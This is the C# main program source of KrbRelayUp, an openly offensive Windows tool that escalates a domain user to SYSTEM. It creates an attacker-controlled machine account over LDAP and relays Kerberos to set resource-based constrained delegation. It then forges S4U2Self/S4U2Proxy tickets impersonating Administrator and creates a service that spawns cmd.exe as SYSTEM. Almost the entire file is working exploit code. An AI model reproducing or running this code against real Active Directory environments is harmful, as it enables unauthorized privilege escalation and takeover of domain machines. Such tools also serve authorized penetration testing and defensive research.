using Asn1;
using KrbRelayUp.Asn1;
using KrbRelayUp.Kerberos;
using KrbRelayUp.Kerberos.PAC;
using KrbRelayUp.lib.Interop;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.Protocols;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace KrbRelayUp
{
    class Program
    {
        public static string domain = null;
        public static string domainDN = "";
        public static string domainController = null;
        public static string computerName = "KRBRELAYUP";
        public static string computerPassword = null;
        public static string computerPasswordHash = null;
        public static string computerSid = null;
        public static string newComputerDN = null;
        public static string port = "12345";
        public static string impersonateUser = "Administrator";
        public static string serviceName = "KrbSCM";
        public static string serviceCommand = null;
        public static string targetSPN = $"HOST/{Environment.MachineName.ToUpper()}";

        public static void GetHelp()
        {
            Console.WriteLine("RELAY:");
            Console.WriteLine("Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]\n");
            Console.WriteLine("    -d  (--Domain)                   FQDN of domain.");
            Console.WriteLine("    -c  (--CreateNewComputerAccount)    Create new computer account for RBCD. Will use the current authenticated user.");
            Console.WriteLine("    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (deafult=KRBRELAYUP$ [if -c is enabled])");
            Console.WriteLine("    -cp (--ComputerPassword)         Password of computer account for RBCD. (deafult=RANDOM [if -c is enabled])");
            Console.WriteLine("    -ch (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (Optional)");
            Console.WriteLine("    -p  (--Port)                     Port for Com Server (default=12345)");
            
            Console.WriteLine("");
            Console.WriteLine("SPAWN:");
            Console.WriteLine("Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>\n");
            Console.WriteLine("    -d  (--Domain)                   FQDN of domain.");
            Console.WriteLine("    -cn (--ComputerName)             Name of attacker owned computer account for RBCD. (deafult=KRBRELAYUP$ [if -c is enabled])");
            Console.WriteLine("    -cp (--ComputerPassword)         Password of computer account for RBCD. (deafult=RANDOM [if -c is enabled])");
            Console.WriteLine("    -ch (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (Optional)");
            Console.WriteLine("    -i  (--Impersonate)              User to impersonate. should be a local admininstrator in the target computer. (default=Administrator)");
            Console.WriteLine("    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
            Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM");

            Console.WriteLine("");
            Console.WriteLine("KRBSCM:");
            Console.WriteLine("Usage: KrbRelayUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>\n");
            Console.WriteLine("    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)");
            Console.WriteLine("    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM");

            Console.WriteLine("");
            Environment.Exit(0);
        }

        static void Main(string[] args)
        {
            Console.WriteLine("KrbRelayUp - Relaying you to SYSTEM\n");

            if (args.Length == 0)
            {
                GetHelp();
            }

            if (args[0].ToLower() == "system")
            {
                try
                {
                    KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));
                }
                catch { }
                Environment.Exit(0);
            }

            

            // parse args
            int iDomain = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(d|Domain)$").Match(s).Success);
            int iCreateNewComputerAccount = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(c|CreateNewComputerAccount)$").Match(s).Success);
            int iComputerName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cn|ComputerName)$").Match(s).Success);
            int iComputerPassword = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cp|ComputerPassword)$").Match(s).Success);
            int iComputerPasswordHash = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ch|ComputerPasswordHash)$").Match(s).Success);
            int iPort = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(p|Port)$").Match(s).Success);
            int iImpersonate = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(i|Impersonate)$").Match(s).Success);
            int iServiceName = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(s|ServiceName)$").Match(s).Success);
            int iServiceCommand = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(sc|ServiceCommand)$").Match(s).Success);


            if (iServiceName != -1)
                serviceName = args[iServiceName + 1];

            if (iServiceCommand != -1)
                serviceCommand = args[iServiceCommand + 1];

            if (args[0].ToLower() == "krbscm")
            {
                KrbSCM.Run(targetSPN, serviceName, serviceCommand);
                Environment.Exit(0);
            }

            if (iDomain == -1)
            {
                Console.WriteLine("Must supply FQDN using [-d FQDN]");
                GetHelp();
            }

            domain = args[iDomain + 1];

            domainController = Networking.GetDCName(domain);

            foreach (string dc in domain.Split('.'))
            {
                domainDN += string.Concat(",DC=", dc);
            }
            domainDN = domainDN.TrimStart(',');

            if (iComputerName != -1)
            {
                computerName = args[iComputerName + 1];
                computerName = computerName.TrimEnd('$');
            }

            if (iComputerPassword != -1)
                computerPassword = args[iComputerPassword + 1];

            if (iComputerPasswordHash != -1)
                computerPasswordHash = args[iComputerPasswordHash + 1];

            // Bind to LDAP using current authenticated user
            LdapDirectoryIdentifier identifier = new LdapDirectoryIdentifier(domainController, 389);
            LdapConnection ldapConnection = new LdapConnection(identifier);
            ldapConnection.SessionOptions.Sealing = true;
            ldapConnection.SessionOptions.Signing = true;
            ldapConnection.Bind();

            if (args[0].ToLower() == "relay")
            {
                Console.WriteLine();

                // if CreateComputerAccount is enabled
                if (iCreateNewComputerAccount != -1)
                {
                    newComputerDN = $"CN={computerName},CN=Computers,{domainDN}";

                    if (String.IsNullOrEmpty(computerPassword))
                        computerPassword = RandomPasswordGenerator(16);

                    AddRequest request = new AddRequest();
                    request.DistinguishedName = newComputerDN;
                    request.Attributes.Add(new DirectoryAttribute("objectClass", "Computer"));
                    request.Attributes.Add(new DirectoryAttribute("SamAccountName", $"{computerName}$"));
                    request.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));
                    request.Attributes.Add(new DirectoryAttribute("DnsHostName", $"{computerName}.{domain}"));
                    request.Attributes.Add(new DirectoryAttribute("ServicePrincipalName", $"HOST/{computerName}.{domain}", $"RestrictedKrbHost/{computerName}.{domain}", $"HOST/{computerName}", $"RestrictedKrbHost/{computerName}"));
                    request.Attributes.Add(new DirectoryAttribute("unicodePwd", Encoding.Unicode.GetBytes($"\"{computerPassword}\"")));

                    try
                    {
                        DirectoryResponse res = ldapConnection.SendRequest(request);
                        Console.WriteLine($"[+] Computer account \"{computerName}$\" added with password \"{computerPassword}\"");
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine($"[-] Could not add new computer account:");
                        Console.WriteLine($"[-] {e.Message}");
                        Environment.Exit(0);
                    }

                }

                // Get Computer SID for RBCD
                string sid = GetObjectSidForComputerName(ldapConnection, computerName, (newComputerDN != null) ? newComputerDN : domainDN);

                if (iPort != -1)
                    port = args[iPort + 1];

                Relay.Relay.Run(domain, domainController, sid, port);
            }

            if (args[0].ToLower() == "spawn")
            {
                Interop.KERB_ETYPE eType = new Interop.KERB_ETYPE();
                string hash = null;

                if (!String.IsNullOrEmpty(computerPassword))
                {
                    string salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), computerName.ToLower(), domain.ToLower());
                    hash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.aes256_cts_hmac_sha1, computerPassword, salt);
                    eType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (!String.IsNullOrEmpty(computerPasswordHash))
                {
                    hash = computerPasswordHash;
                    eType = Interop.KERB_ETYPE.rc4_hmac;
                }

                byte[] bInnerTGT = AskTGT.TGT($"{computerName}$", domain, hash, eType, outfile: null, ptt: true);
                KRB_CRED TGT = new KRB_CRED(bInnerTGT);

                if (iImpersonate != -1)
                {
                    impersonateUser = args[iImpersonate + 1];
                }

                KRB_CRED elevateTicket = S4U.S4U2Self(TGT, impersonateUser, targetSPN, outfile: null, ptt: true);
                S4U.S4U2Proxy(TGT, impersonateUser, targetSPN, outfile: null, ptt: true, tgs: elevateTicket);

                System.Threading.Thread.Sleep(1500);

                KrbSCM.Run(targetSPN, serviceName, serviceCommand);
                Environment.Exit(0);
            }


        }

        public static string GetObjectSidForComputerName(LdapConnection ldapConnection, string computerName, string searchBase)
        {
            string searchFilter = $"(sAMAccountName={computerName}$)";
            SearchRequest searchRequest = new SearchRequest(searchBase, searchFilter, System.DirectoryServices.Protocols.SearchScope.Subtree, new string[] { "DistinguishedName", "objectSid" });
            try
            {
                var response = (SearchResponse)ldapConnection.SendRequest(searchRequest);
                return (new SecurityIdentifier((byte[])response.Entries[0].Attributes["objectSid"][0], 0)).ToString();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Could not find computer account SID:");
                Console.WriteLine($"[-] {e.Message}");
                Environment.Exit(0);
            }
            return null;
        }

        static string RandomPasswordGenerator(int length)
        {
            string alphaCaps = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string alphaLow = "abcdefghijklmnopqrstuvwxyz";
            string numerics = "1234567890";
            string special = "@#$-=/";
            string[] allChars = { alphaLow, alphaCaps, numerics, special };
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            int t = 0;
            while (0 < length--)
            {
                res.Append(allChars[t][rnd.Next(allChars[t].Length)]);
                if (t == 3)
                    t = 0;
                else
                    t++;
            }
            return res.ToString();
        }
    }
}
